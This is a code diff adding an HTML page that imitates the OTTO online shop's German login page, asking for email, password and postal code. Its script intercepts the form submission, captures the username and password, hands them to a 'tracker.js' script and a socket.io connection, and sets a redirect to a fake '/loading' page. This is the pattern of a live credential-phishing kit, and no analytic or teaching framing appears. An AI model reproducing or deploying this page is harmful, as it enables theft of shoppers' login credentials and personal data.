@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTTO - Anmeldung</title>
+    <link rel="stylesheet" href="/css/otto.css">
+</head>
+<body>
+
+   <div class="pl_focussed-dialog__container">
+        
+            <div class="hedopan">
+                <img src="./img/hedoipa.PNG" alt="OTTO" />
+            </div>
+        
+        
+        <section class="pl_focussed-dialog__content">
+            <h1 class="identity_focused_dialog_headline">Anmeldung</h1>
+            
+            <form id="OTO-Login" method="post" class="form" >
+                <div class="input-group">
+                    <input type="email" name="username" id="username" placeholder=" " required autocomplete="username">
+                    <label for="emailInput">E-Mail-Adresse</label>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" name="password" id="password" placeholder=" " required autocomplete="current-password">
+                    <label for="passwordInput">Passwort</label>
+                    <button type="button" class="show-pw">Anzeigen</button>
+                </div>
+
+                <div class="input-group">
+                    <input type="text" name="Postleitzahl" id="zipInput" placeholder=" " required>
+                    <label for="zipInput">Postleitzahl</label>
+                </div>
+
+                <div class="stay-logged-in">
+                    <input type="checkbox" id="rememberMe" name="rememberMe"    >
+                    <label for="rememberMe">
+                        Angemeldet bleiben &nbsp;-&nbsp; <a href="#" class="blue-link">Was ist das?</a>
+                    </label>
+                </div>
+
+                <div class="forgot-pw-group">
+                    <a href="#">Passwort vergessen / Probleme bei der<br>Anmeldung</a>
+                </div>
+
+                <button type="submit" class="btn btn-red">Anmelden</button>
+                <a href="#" class="btn btn-gray" style="text-decoration: none;">Neu bei OTTO? Jetzt registrieren</a>
+            </form>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-lines">
+            <a href="#">Cookie-Einstellungen</a> &middot;
+            <a href="#">AGB</a> &middot;
+            <a href="#">Datenschutz</a> &middot;
+            <a href="#">Impressum</a> &middot;
+            <br>
+            <a href="#">Information zur Barrierefreiheit</a> &middot;
+            <a href="#">Produktsicherheitsrückrufe</a> &middot;
+            <a href="#">OTTO Versprechen</a>
+        </div>
+        <div class="price-info">
+            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
+        </div>
+    </footer>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/tracker.js"></script>
+    <script>
+        // Custom logic to handle form submission for tracking
+        document.getElementById('OTO-Login').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username.trim() || !password.trim()) {
+                return;
+            }
+
+            // Set redirect URL for tracker.js to pick up dynamically before submission
+            document.getElementById('OTO-Login').setAttribute('data-redirect', '/loading?time=3&url=REFUD6a7d5affa');
+            
+            // Allow tracker.js or socket to pick up the final submission
+            // We simulate the next step if tracker expects it
+        });
+
+        // Show/Hide password toggle logic
+        const togglePassword = document.querySelector('.show-pw');
+        const passwordInput = document.getElementById('password');
+
+        togglePassword.addEventListener('click', function (e) {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? 'Anzeigen' : 'Verbergen';
+        });
+    </script>
+</body>
+</html>
